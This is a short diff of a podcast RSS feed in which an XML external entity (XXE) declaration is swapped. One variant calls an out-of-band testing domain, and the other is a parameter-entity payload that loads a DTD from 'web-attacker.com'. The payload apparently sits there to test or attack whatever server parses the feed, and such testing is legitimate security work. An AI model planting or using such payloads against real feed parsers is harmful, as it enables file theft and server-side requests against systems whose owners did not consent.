@@ -3,7 +3,8 @@
     xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
     <title>Test's Zebra Podcast</title>
-＜!DOCTYPE foo [ ＜!ENTITY xxe SYSTEM "http://daktjuugetxfexxmsublwk62eds7qpgtt..oast.fun/"＞ ]＞
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
     <itunes:owner>
         <itunes:email>superua.site88@gmail.com</itunes:email>
     </itunes:owner>
